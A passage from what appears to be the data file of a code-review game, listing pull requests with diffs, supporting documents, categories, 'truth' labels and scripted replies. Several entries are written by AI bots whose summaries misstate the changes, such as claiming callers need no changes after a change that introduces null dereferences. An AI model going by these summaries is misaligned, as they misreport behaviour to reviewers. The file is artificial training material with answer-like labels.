<span class="diff-add">+  }</span>
<span class="diff-ctx"> </span>
<span class="diff-del">-  async deleteUser(id: string): Promise&lt;void&gt; {</span>
<span class="diff-del">-    await this.database.query('DELETE FROM users WHERE id = $1', [id])</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async deleteUser(userId: string): Promise&lt;void&gt; {</span>
<span class="diff-add">+    await this.databaseClient.query('DELETE FROM users WHERE id = $1', [userId])</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx"> </span>
<span class="diff-add">+  private _extractFirstRow&lt;T&gt;(result: { rows: T[] }): T {</span>
<span class="diff-add">+    return result.rows[0]</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  private _handleError(method: string, context: Record&lt;string, unknown&gt;): void {</span>
<span class="diff-add">+    logger.error(\`\${method} failed\`, context)</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  private _buildSetClause(fields: string[]): string {</span>
<span class="diff-add">+    return fields.map((f, i) =&gt; \`\${f} = $\${i + 2}\`).join(', ')</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">@@ -65,18 +77,22 @@</span>
<span class="diff-del">-  async listUsers(opts?: { limit?: number; offset?: number }): Promise&lt;User[]&gt; {</span>
<span class="diff-del">-    const limit = opts?.limit ?? 50</span>
<span class="diff-del">-    const offset = opts?.offset ?? 0</span>
<span class="diff-del">-    const result = await this.database.query(</span>
<span class="diff-del">-      'SELECT * FROM users ORDER BY created_at DESC LIMIT $1 OFFSET $2',</span>
<span class="diff-del">-      [limit, offset]</span>
<span class="diff-del">-    )</span>
<span class="diff-del">-    return result.rows</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async listUsers(paginationOptions?: {</span>
<span class="diff-add">+    limit?: number</span>
<span class="diff-add">+    offset?: number</span>
<span class="diff-add">+  }): Promise&lt;User[]&gt; {</span>
<span class="diff-add">+    const pageLimit = paginationOptions?.limit ?? 50</span>
<span class="diff-add">+    const pageOffset = paginationOptions?.offset ?? 0</span>
<span class="diff-add">+    const queryResult = await this.databaseClient.query(</span>
<span class="diff-add">+      'SELECT * FROM users ORDER BY created_at DESC LIMIT $1 OFFSET $2',</span>
<span class="diff-add">+      [pageLimit, pageOffset]</span>
<span class="diff-add">+    )</span>
<span class="diff-add">+    return queryResult.rows as User[]</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">@@ -86,12 +102,14 @@</span>
<span class="diff-del">-  async getUserByEmail(email: string): Promise&lt;User | null&gt; {</span>
<span class="diff-del">-    const result = await this.database.query(</span>
<span class="diff-del">-      'SELECT * FROM users WHERE email = $1',</span>
<span class="diff-del">-      [email]</span>
<span class="diff-del">-    )</span>
<span class="diff-del">-    return result.rows[0] ?? null</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getUserByEmail(emailAddress: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    const queryResult = await this.databaseClient.query(</span>
<span class="diff-add">+      'SELECT * FROM users WHERE email = $1',</span>
<span class="diff-add">+      [emailAddress]</span>
<span class="diff-add">+    )</span>
<span class="diff-add">+    return this._extractFirstRow&lt;User&gt;(queryResult) ?? null</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">@@ -101,10 +119,12 @@</span>
<span class="diff-del">-  async countUsers(): Promise&lt;number&gt; {</span>
<span class="diff-del">-    const result = await this.database.query('SELECT COUNT(*) FROM users')</span>
<span class="diff-del">-    return parseInt(result.rows[0].count)</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async countUsers(): Promise&lt;number&gt; {</span>
<span class="diff-add">+    const queryResult = await this.databaseClient.query('SELECT COUNT(*) FROM users')</span>
<span class="diff-add">+    const countValue = parseInt(queryResult.rows[0].count, 10)</span>
<span class="diff-add">+    return countValue</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">}</span></pre>`,
    documents: [
      {
        id: 'doc-004-summary',
        label: 'Summary',
        bodyHtml: `<div style="padding:12px">
  <h3>AI-Generated Refactor Summary</h3>
  <p>This PR was generated by <strong>MEGACORP AI Code Quality Bot v2.3</strong> to improve code quality and maintainability.</p>
  <p><strong>Motivation:</strong> The UserService class was identified as having a "maintainability score" below threshold (62/100) by the automated analysis pipeline.</p>
  <p><strong>What changed:</strong></p>
  <ul>
    <li>Renamed <code>database</code> → <code>databaseClient</code> for clarity</li>
    <li>Renamed parameter <code>id</code> → <code>userId</code>, <code>data</code> → <code>userData</code>, <code>err</code> → <code>error</code></li>
    <li>Extracted <code>_extractFirstRow</code>, <code>_handleError</code>, <code>_buildSetClause</code> helpers</li>
    <li>Reordered imports alphabetically by module path</li>
    <li>Added <code>type</code> keyword to type imports</li>
    <li>Added explicit radix to <code>parseInt</code></li>
  </ul>
  <p><strong>Behavior change:</strong> None. All existing tests pass. This is purely cosmetic.</p>
  <p style="color:#888;font-size:11px">Generated by AI-Bot. Not manually reviewed before submission.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-005',
    spawnAt: 150000,
    title: 'chore(deps): bump typescript from 5.4.5 to 5.5.3',
    author: 'devx-bot',
    team: 'devx',
    branch: 'devx-bot/bump-typescript-5.5',
    description: 'Bumps TypeScript from 5.4.5 to 5.5.3. The good times were better. TypeScript 5.4 had everything we needed. Simpler. Quieter. The errors made sense back then. CI is green.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/package.json b/package.json</span>
<span class="diff-ctx">index 3c1a9f2..8b4d7e1 100644</span>
<span class="diff-ctx">--- a/package.json</span>
<span class="diff-ctx">+++ b/package.json</span>
<span class="diff-ctx">@@ -18,7 +18,7 @@</span>
<span class="diff-ctx">   "devDependencies": {</span>
<span class="diff-ctx">     "@types/node": "^20.11.0",</span>
<span class="diff-ctx">     "eslint": "^8.57.0",</span>
<span class="diff-del">-    "typescript": "5.5.3",</span>
<span class="diff-add">+    "typescript": "5.4.5",</span>
<span class="diff-ctx">     "vitest": "^1.6.0"</span>
<span class="diff-ctx">   }</span>
<span class="diff-ctx"> }</span>
<span class="diff-ctx">diff --git a/package-lock.json b/package-lock.json</span>
<span class="diff-ctx">index 9f1b2c4..2d8a3e7 100644</span>
<span class="diff-ctx">--- a/package-lock.json</span>
<span class="diff-ctx">+++ b/package-lock.json</span>
<span class="diff-ctx">@@ -4820,7 +4820,7 @@</span>
<span class="diff-ctx">     "typescript": {</span>
<span class="diff-del">-      "version": "5.5.3",</span>
<span class="diff-del">-      "resolved": "https://registry.npmjs.org/typescript/-/typescript-5.5.3.tgz",</span>
<span class="diff-del">-      "integrity": "sha512-/hreyEujaB0w76zKo6717l3L0o/qEUtRgdvUBvlkhoWeOVMjMuHNAk16FcknOjXFf/VLgJkX99KqGGe2RKk8Q==",</span>
<span class="diff-add">+      "version": "5.4.5",</span>
<span class="diff-add">+      "resolved": "https://registry.npmjs.org/typescript/-/typescript-5.4.5.tgz",</span>
<span class="diff-add">+      "integrity": "sha512-vcI4UpRgg81oIRUFwR0jzmVyf9dfFkM94+9E3tGNx6Y7KL3RlTr3TSPchGH1b7xUr78nsFY/UMiOsNfI8kNnA==",</span>
<span class="diff-ctx">       "dev": true</span>
<span class="diff-ctx">     }</span>
<span class="diff-ctx"> }</span></pre>`,
    documents: [
      {
        id: 'doc-005-changelog',
        label: 'TS 5.4 Highlights',
        bodyHtml: `<div style="padding:12px">
  <h3>TypeScript 5.4 — Key Changes</h3>
  <ul>
    <li><strong>Preserved narrowing in closures following last assignments</strong> — variables narrowed before the last assignment stay narrowed inside closures</li>
    <li><strong><code>NoInfer</code> utility type</strong> — prevents type argument inference from a specific position</li>
    <li><strong>Object.groupBy and Map.groupBy support</strong></li>
    <li><strong>Improved checks between conditional types and template literal types</strong></li>
  </ul>
  <p style="font-size:11px;color:#888">Bump generated by DevX tooling. Tested on CI — all checks green.</p>
</div>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [
      'The title says "bump from 5.4.5 to 5.5.3" but the diff goes the other direction — it\'s removing 5.5.3 and installing 5.4.5',
      'The description is uncharacteristically wistful for an automated bot: "The good times were better"',
    ],
  },
  {
    id: 'pr-brad-001',
    spawnAt: 155000,
    title: 'refactor(utils): extract StringHelper class for improved string management',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/refactor-extract-string-helper-class',
    description: `Extracts string utility functions into a cohesive \`StringHelper\` class, establishing a single source of truth for string operations across the codebase.\n\n**Changes:**\n- New \`StringHelper\` class in \`utils/strings.ts\` with comprehensive JSDoc\n- Updated callers in \`UserCard.tsx\` and \`NotificationList.tsx\`\n- Added backwards-compatible re-exports in \`utils/index.ts\`\n- Follows SOLID principles (Single Responsibility)\n\nAll existing tests pass. No behavior changes.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/utils/strings.ts b/src/utils/strings.ts</span>
<span class="diff-ctx">index 2c4f1a3..9e8b7d2 100644</span>
<span class="diff-ctx">--- a/src/utils/strings.ts</span>
<span class="diff-ctx">+++ b/src/utils/strings.ts</span>
<span class="diff-ctx">@@ -1,8 +1,54 @@</span>
<span class="diff-del">-export function capitalize(s: string): string {</span>
<span class="diff-del">-  return s.charAt(0).toUpperCase() + s.slice(1)</span>
<span class="diff-del">-}</span>
<span class="diff-del">-</span>
<span class="diff-del">-export function truncate(s: string, maxLen: number): string {</span>
<span class="diff-del">-  return s.length &gt; maxLen ? s.slice(0, maxLen) + '…' : s</span>
<span class="diff-del">-}</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * StringHelper provides a comprehensive suite of string manipulation utilities.</span>
<span class="diff-add">+ * Centralizes string operations to improve cohesion and reduce duplication.</span>
<span class="diff-add">+ * @class StringHelper</span>
<span class="diff-add">+ * @since 1.0.0</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export class StringHelper {</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * Capitalizes the first character of the input string.</span>
<span class="diff-add">+   * @param {string} input - The string to capitalize</span>
<span class="diff-add">+   * @returns {string} The capitalized string</span>
<span class="diff-add">+   * @throws {TypeError} If input is not of type string</span>
<span class="diff-add">+   * @example StringHelper.capitalize('hello') // 'Hello'</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  static capitalize(input: string): string {</span>
<span class="diff-add">+    // Return early if the input string has no characters</span>
<span class="diff-add">+    if (!input || input.length === 0) {</span>
<span class="diff-add">+      // An empty string cannot be capitalized</span>
<span class="diff-add">+      return ''</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+    // Extract and uppercase the first character</span>
<span class="diff-add">+    const firstCharacter = input.charAt(0)</span>
<span class="diff-add">+    const uppercasedFirstCharacter = firstCharacter.toUpperCase()</span>
<span class="diff-add">+    // Extract all characters after the first</span>
<span class="diff-add">+    const remainingCharacters = input.slice(1)</span>
<span class="diff-add">+    // Concatenate and return the result</span>
<span class="diff-add">+    return uppercasedFirstCharacter + remainingCharacters</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * Truncates a string to the specified maximum length with ellipsis.</span>
<span class="diff-add">+   * @param {string} input - The string to truncate</span>
<span class="diff-add">+   * @param {number} maxLen - Maximum allowed character length</span>
<span class="diff-add">+   * @returns {string} Truncated string with ellipsis, or original if short enough</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  static truncate(input: string, maxLen: number): string {</span>
<span class="diff-add">+    // Determine if truncation is required</span>
<span class="diff-add">+    const inputExceedsMaximumLength = input.length &gt; maxLen</span>
<span class="diff-add">+    if (inputExceedsMaximumLength) {</span>
<span class="diff-add">+      // Slice to max length and append ellipsis character</span>
<span class="diff-add">+      const truncatedPortion = input.slice(0, maxLen)</span>
<span class="diff-add">+      return truncatedPortion + '…'</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+    // Return unchanged if within limit</span>
<span class="diff-add">+    return input</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+}</span>
<span class="diff-ctx">diff --git a/src/utils/index.ts b/src/utils/index.ts</span>
<span class="diff-ctx">--- a/src/utils/index.ts</span>
<span class="diff-ctx">+++ b/src/utils/index.ts</span>
<span class="diff-ctx">@@ -1,3 +1,7 @@</span>
<span class="diff-ctx"> export * from './date'</span>
<span class="diff-ctx"> export * from './collection'</span>
<span class="diff-del">-export * from './strings'</span>
<span class="diff-add">+export { StringHelper } from './strings'</span>
<span class="diff-add">+// Backwards-compatible named exports</span>
<span class="diff-add">+// TODO: migrate callers to StringHelper.capitalize / StringHelper.truncate</span>
<span class="diff-add">+export const capitalize = StringHelper.capitalize</span>
<span class="diff-add">+export const truncate = StringHelper.truncate.bind(StringHelper)</span>
<span class="diff-ctx">diff --git a/src/components/UserCard.tsx b/src/components/UserCard.tsx</span>
<span class="diff-ctx">--- a/src/components/UserCard.tsx</span>
<span class="diff-ctx">+++ b/src/components/UserCard.tsx</span>
<span class="diff-ctx">@@ -1,5 +1,5 @@</span>
<span class="diff-del">-import { capitalize, truncate } from '../utils'</span>
<span class="diff-add">+import { StringHelper } from '../utils'</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> export function UserCard({ name, bio }: { name: string, bio: string }) {</span>
<span class="diff-del">-  return &lt;div&gt;&lt;h2&gt;{capitalize(name)}&lt;/h2&gt;&lt;p&gt;{truncate(bio, 120)}&lt;/p&gt;&lt;/div&gt;</span>
<span class="diff-add">+  return &lt;div&gt;&lt;h2&gt;{StringHelper.capitalize(name)}&lt;/h2&gt;&lt;p&gt;{StringHelper.truncate(bio, 120)}&lt;/p&gt;&lt;/div&gt;</span>
<span class="diff-ctx"> }</span>
<span class="diff-ctx">diff --git a/src/components/NotificationList.tsx b/src/components/NotificationList.tsx</span>
<span class="diff-ctx">--- a/src/components/NotificationList.tsx</span>
<span class="diff-ctx">+++ b/src/components/NotificationList.tsx</span>
<span class="diff-ctx">@@ -2,7 +2,7 @@</span>
<span class="diff-del">-import { truncate } from '../utils'</span>
<span class="diff-add">+import { StringHelper } from '../utils'</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> export function NotificationList({ items }: { items: Notification[] }) {</span>
<span class="diff-del">-  return items.map(n =&gt; &lt;div key={n.id}&gt;{truncate(n.title, 60)}&lt;/div&gt;)</span>
<span class="diff-add">+  return items.map(n =&gt; &lt;div key={n.id}&gt;{StringHelper.truncate(n.title, 60)}&lt;/div&gt;)</span>
<span class="diff-ctx"> }</span></pre>`,
    documents: [
      {
        id: 'doc-brad-001-summary',
        label: 'Refactor Summary',
        bodyHtml: `<div style="padding:12px">
  <h3>AI-Generated Refactor Summary</h3>
  <p>This PR was generated by <strong>Brad++ 🤖</strong> as part of the automated code quality improvement initiative.</p>
  <p><strong>Motivation:</strong> The <code>strings.ts</code> module contained loose exported functions with no organizational structure. Grouping them into a class improves discoverability and applies OOP principles.</p>
  <p><strong>Callers not yet migrated:</strong> <code>SearchResults.tsx</code>, <code>ActivityFeed.tsx</code> — still using the named exports from <code>utils/index.ts</code>. The backwards-compatible re-exports preserve their behavior until a follow-up migration PR.</p>
  <p style="color:#888;font-size:11px">Note: <code>truncate.bind(StringHelper)</code> is technically unnecessary since static methods don't use <code>this</code>. Will clean up in a follow-up.</p>
  <p style="color:#888;font-size:11px">Generated by Brad++ 🤖. Not manually reviewed before submission.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'request-changes on the StringHelper refactor but no comment provided. all tests pass. this follows SOLID principles. what specifically is the concern?',
    },
  },
  {
    id: 'pr-006',
    spawnAt: 170000,
    title: 'fix(ci): add retry wrapper to stop flaky auth integration test',
    author: 'brad',
    team: 'platform',
    branch: 'brad/fix-flaky-auth-test',
    description: 'The `auth-service.integration.test.ts:L88` test has been failing intermittently in CI for the last two weeks (14 failures out of 200 runs). Root cause: test makes a real HTTP call to the internal token endpoint which occasionally times out under CI load. Fix: wrap the assertion in a small retry helper (max 3 attempts, 500ms backoff). Not ideal but unblocks the team while we track down the real latency issue.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/services/__tests__/auth-service.integration.test.ts b/src/services/__tests__/auth-service.integration.test.ts</span>
<span class="diff-ctx">index 7e2c1b3..4f9a8d2 100644</span>
<span class="diff-ctx">--- a/src/services/__tests__/auth-service.integration.test.ts</span>
<span class="diff-ctx">+++ b/src/services/__tests__/auth-service.integration.test.ts</span>
<span class="diff-ctx">@@ -1,5 +1,22 @@</span>
<span class="diff-ctx"> import { describe, it, expect } from 'vitest'</span>
<span class="diff-ctx"> import { AuthService } from '../auth-service'</span>
<span class="diff-ctx"> </span>
<span class="diff-add">+async function withRetry&lt;T&gt;(</span>
<span class="diff-add">+  fn: () =&gt; Promise&lt;T&gt;,</span>
<span class="diff-add">+  maxAttempts = 3,</span>
<span class="diff-add">+  backoffMs = 500,</span>
<span class="diff-add">+): Promise&lt;T&gt; {</span>
<span class="diff-add">+  let lastError: unknown</span>
<span class="diff-add">+  for (let attempt = 0; attempt &lt; maxAttempts; attempt++) {</span>
<span class="diff-add">+    try {</span>
<span class="diff-add">+      return await fn()</span>
<span class="diff-add">+    } catch (err) {</span>
<span class="diff-add">+      lastError = err</span>
<span class="diff-add">+      if (attempt &lt; maxAttempts - 1) {</span>
<span class="diff-add">+        await new Promise(r =&gt; setTimeout(r, backoffMs))</span>
<span class="diff-add">+      }</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+  throw lastError</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-ctx"> describe('AuthService integration', () =&gt; {</span>
<span class="diff-ctx">@@ -85,10 +102,12 @@</span>
<span class="diff-ctx">   it('validates token against internal endpoint', async () =&gt; {</span>
<span class="diff-del">-    const result = await authService.validateToken(testToken)</span>
<span class="diff-del">-    expect(result.valid).toBe(true)</span>
<span class="diff-del">-    expect(result.userId).toBe('test-user-001')</span>
<span class="diff-add">+    const result = await withRetry(() =&gt; authService.validateToken(testToken))</span>
<span class="diff-add">+    expect(result.valid).toBe(true)</span>
<span class="diff-add">+    expect(result.userId).toBe('test-user-001')</span>
<span class="diff-ctx">   })</span>
<span class="diff-ctx"> })</span></pre>`,
    documents: [
      {
        id: 'doc-006-ci-history',
        label: 'CI Failure History',
        bodyHtml: `<div style="padding:12px">
  <h3>Flaky Test History — auth-service.integration.test.ts:L88</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px">
    <thead>
      <tr style="background:#c0c0c0">
        <th style="padding:4px 8px;text-align:left">Date</th>
        <th style="padding:4px 8px;text-align:left">Result</th>
        <th style="padding:4px 8px;text-align:left">Duration</th>
      </tr>
    </thead>
    <tbody>
      <tr><td style="padding:4px 8px">2024-07-01</td><td style="padding:4px 8px;color:red">FAIL</td><td style="padding:4px 8px">timeout 5002ms</td></tr>
      <tr><td style="padding:4px 8px">2024-07-01</td><td style="padding:4px 8px;color:green">PASS</td><td style="padding:4px 8px">312ms</td></tr>
      <tr><td style="padding:4px 8px">2024-07-02</td><td style="padding:4px 8px;color:green">PASS</td><td style="padding:4px 8px">287ms</td></tr>
      <tr><td style="padding:4px 8px">2024-07-03</td><td style="padding:4px 8px;color:red">FAIL</td><td style="padding:4px 8px">timeout 5001ms</td></tr>
      <tr><td style="padding:4px 8px">2024-07-03</td><td style="padding:4px 8px;color:green">PASS</td><td style="padding:4px 8px">445ms</td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888;margin-top:8px">7% failure rate over last 200 runs. Tracked in PLAT-4389.</p>
</div>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad',
      sender: 'brad',
      body: "yo why'd you reject the retry wrapper? the test was literally failing every 5 runs in CI. i have the screenshots. what's your concern here",
    },
  },
  {
    id: 'pr-brad-002',
    spawnAt: 188000,
    title: 'fix(api-client): add error handling to prevent unhandled promise rejections',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/fix-api-client-unhandled-rejections',
    description: `Addresses unhandled promise rejections across the API client layer. Wraps all async methods in try/catch blocks so errors are handled gracefully rather than crashing the caller.\n\n**Changes:**\n- \`api/client.ts\`: Added error handling to \`fetchUser\`, \`fetchOrder\`, \`fetchCart\`\n- \`services/notification.ts\`: Same pattern applied for consistency\n- \`services/recommendation.ts\`: Same pattern applied for consistency\n\nNo breaking changes. All existing tests pass.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/api/client.ts b/src/api/client.ts</span>
<span class="diff-ctx">index 4a1f2b3..7c9d8e2 100644</span>
<span class="diff-ctx">--- a/src/api/client.ts</span>
<span class="diff-ctx">+++ b/src/api/client.ts</span>
<span class="diff-ctx">@@ -12,22 +12,34 @@</span>
<span class="diff-del">-  async fetchUser(id: string): Promise&lt;User&gt; {</span>
<span class="diff-del">-    const response = await this.http.get(\`/users/\${id}\`)</span>
<span class="diff-del">-    return response.data</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async fetchUser(id: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    try {</span>
<span class="diff-add">+      // Attempt to fetch the user from the API endpoint</span>
<span class="diff-add">+      const response = await this.http.get(\`/users/\${id}\`)</span>
<span class="diff-add">+      // Return the user data from the successful response</span>
<span class="diff-add">+      return response.data</span>
<span class="diff-add">+    } catch (error) {</span>
<span class="diff-add">+      // Log the error for debugging and observability purposes</span>
<span class="diff-add">+      console.error('fetchUser failed:', error)</span>
<span class="diff-add">+      // Return null to indicate the user could not be fetched</span>
<span class="diff-add">+      return null</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx"> </span>
<span class="diff-del">-  async fetchOrder(id: string): Promise&lt;Order&gt; {</span>
<span class="diff-del">-    const response = await this.http.get(\`/orders/\${id}\`)</span>
<span class="diff-del">-    return response.data</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async fetchOrder(id: string): Promise&lt;Order | null&gt; {</span>
<span class="diff-add">+    try {</span>
<span class="diff-add">+      // Attempt to fetch the order from the API endpoint</span>
<span class="diff-add">+      const response = await this.http.get(\`/orders/\${id}\`)</span>
<span class="diff-add">+      // Return the order data from the successful response</span>
<span class="diff-add">+      return response.data</span>
<span class="diff-add">+    } catch (error) {</span>
<span class="diff-add">+      // Log the error to aid in future debugging</span>
<span class="diff-add">+      console.error('fetchOrder failed:', error)</span>
<span class="diff-add">+      // Return null to indicate the order could not be fetched</span>
<span class="diff-add">+      return null</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">diff --git a/src/services/notification.ts b/src/services/notification.ts</span>
<span class="diff-ctx">--- a/src/services/notification.ts</span>
<span class="diff-ctx">+++ b/src/services/notification.ts</span>
<span class="diff-ctx">@@ -8,10 +8,14 @@</span>
<span class="diff-del">-  async send(userId: string, message: string): Promise&lt;void&gt; {</span>
<span class="diff-del">-    const user = await this.client.fetchUser(userId)</span>
<span class="diff-del">-    await this.emailProvider.send(user.email, message)</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async send(userId: string, message: string): Promise&lt;void&gt; {</span>
<span class="diff-add">+    // Fetch the user, which now returns null on error instead of throwing</span>
<span class="diff-add">+    const user = await this.client.fetchUser(userId)</span>
<span class="diff-add">+    // Access user.email — will throw TypeError if user is null</span>
<span class="diff-add">+    await this.emailProvider.send(user.email, message)</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">diff --git a/src/services/recommendation.ts b/src/services/recommendation.ts</span>
<span class="diff-ctx">--- a/src/services/recommendation.ts</span>
<span class="diff-ctx">+++ b/src/services/recommendation.ts</span>
<span class="diff-ctx">@@ -5,9 +5,13 @@</span>
<span class="diff-del">-  async getRecommendations(userId: string): Promise&lt;Product[]&gt; {</span>
<span class="diff-del">-    const user = await this.client.fetchUser(userId)</span>
<span class="diff-del">-    return this.model.predict(user.preferences)</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getRecommendations(userId: string): Promise&lt;Product[]&gt; {</span>
<span class="diff-add">+    // fetchUser now returns null on network errors</span>
<span class="diff-add">+    const user = await this.client.fetchUser(userId)</span>
<span class="diff-add">+    // user.preferences will throw if user is null — not handled</span>
<span class="diff-add">+    return this.model.predict(user.preferences)</span>
<span class="diff-add">+  }</span></pre>`,
    documents: [
      {
        id: 'doc-brad-002-migration',
        label: 'Migration Guide',
        bodyHtml: `<div style="padding:12px">
  <h3>Migration Guide — Error Handling Update</h3>
  <p>The API client methods now return <code>null</code> on error instead of throwing. This is a more resilient pattern that prevents unhandled promise rejections from propagating to the caller.</p>
  <p><strong>Callers do not need to change.</strong> The null return is handled transparently.</p>
  <p><strong>Before:</strong></p>
  <pre style="background:#f6f8fa;padding:8px;font-size:12px">const user = await client.fetchUser(id)
// user: User (throws on error)</pre>
  <p><strong>After:</strong></p>
  <pre style="background:#f6f8fa;padding:8px;font-size:12px">const user = await client.fetchUser(id)
// user: User | null (returns null on error)</pre>
  <p>Existing callers that access <code>user.email</code> without a null check will continue to work in the happy path.</p>
  <p style="color:#888;font-size:11px">Generated by Brad++ 🤖. Not manually reviewed.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: "i'm confused by the rejection. the original code had unhandled promise rejections. my changes handle them gracefully and improve stability. what's the concern?",
    },
  },
  {
    id: 'pr-007',
    spawnAt: 210000,
    title: 'feat(pricing): add feature flag for new pricing page',
    author: 'growth-pm',
    team: 'growth',
    branch: 'growth/pricing-page-flag',
    description: `Growth team needs this merged before the launch window closes. It just adds a feature flag check — totally safe.\n\n**Context:** New pricing page is ready on the design side. We need the flag in place so the growth team can enable it for internal testing before going wide. This has been in the roadmap for Q3.\n\n**Note from Priya:** This is blocking our launch window. The pricing team and legal have already reviewed the page content. We just need the flag wired up in the frontend routing.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/pages/pricing.tsx b/src/pages/pricing.tsx</span>
<span class="diff-ctx">index 2e4f8a1..7c9b3d4 100644</span>
<span class="diff-ctx">--- a/src/pages/pricing.tsx</span>
<span class="diff-ctx">+++ b/src/pages/pricing.tsx</span>
<span class="diff-ctx">@@ -1,5 +1,6 @@</span>
<span class="diff-ctx"> import React from 'react'</span>
<span class="diff-ctx"> import { LegacyPricingPage } from '../components/LegacyPricingPage'</span>
<span class="diff-add">+import { NewPricingPage } from '../components/NewPricingPage'</span>
<span class="diff-add">+import { useFeatureFlag } from '../hooks/useFeatureFlag'</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> export function PricingPage() {</span>
<span class="diff-del">-  return &lt;LegacyPricingPage /&gt;</span>
<span class="diff-add">+  const showNewPricing = useFeatureFlag('new-pricing-page-v2')</span>
<span class="diff-add">+  if (showNewPricing) {</span>
<span class="diff-add">+    return &lt;NewPricingPage /&gt;</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+  return &lt;LegacyPricingPage /&gt;</span>
<span class="diff-ctx"> }</span></pre>`,
    documents: [
      {
        id: 'doc-007-growth-slack',
        label: 'Growth Slack',
        bodyHtml: `<div style="padding:12px">
  <div style="background:#f0f0f0;border:1px solid #ccc;padding:8px;margin-bottom:8px;border-radius:2px">
    <strong>#growth-launch</strong>
  </div>
  <div style="margin-bottom:12px">
    <strong>priya_growth-pm</strong> <span style="color:#888;font-size:11px">10:47 AM</span>
    <div style="margin-top:4px">hey team the pricing page PR is blocking our launch window, can someone LGTM real quick? it's literally just a feature flag 🙏</div>
  </div>
  <div style="margin-bottom:12px">
    <strong>brad</strong> <span style="color:#888;font-size:11px">10:48 AM</span>
    <div style="margin-top:4px">approved 👍 LGTM</div>
  </div>
  <div style="margin-bottom:12px">
    <strong>priya_growth-pm</strong> <span style="color:#888;font-size:11px">10:48 AM</span>
    <div style="margin-top:4px">omg thank you brad!! still need one more approval though 🙏🙏</div>
  </div>
  <div style="margin-bottom:12px">
    <strong>priya_growth-pm</strong> <span style="color:#888;font-size:11px">10:52 AM</span>
    <div style="margin-top:4px">pinging platform team — launch window closes at 11am. legal and design already signed off. just need an eng approval on the code change</div>
  </div>
</div>`,
      },
    ],
    category: 'cross-team-ask',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: '#growth-launch',
      sender: 'growth-pm',
      body: 'THE LAUNCH WINDOW JUST CLOSED. Legal and design already signed off. It\'s a feature flag. Can someone PLEASE explain what happened here 😡',
    },
    approveReply: {
      channel: '#growth-launch',
      sender: 'growth-pm',
      body: 'YESSS thank you so much!! merging now 🙌 you literally saved the launch. flagging you to our VP as someone who actually gets it 🙏🙏',
    },
  },
  {
    id: 'pr-brad-003',
    spawnAt: 223000,
    title: 'test: add unit test coverage for CheckoutService and OrderService',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/test-checkout-order-coverage',
    description: `Adds comprehensive unit tests for \`CheckoutService\` and \`OrderService\`. Coverage increases from 34% to 89%, directly addressing the Q3 quality initiative.\n\n**Coverage delta:**\n- \`CheckoutService\`: 12% → 91%\n- \`OrderService\`: 8% → 87%\n\nAll tests pass. Added to CI pipeline.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/checkout/__tests__/checkout.test.ts b/src/checkout/__tests__/checkout.test.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..4a8f2b1</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/checkout/__tests__/checkout.test.ts</span>
<span class="diff-ctx">@@ -0,0 +1,68 @@</span>
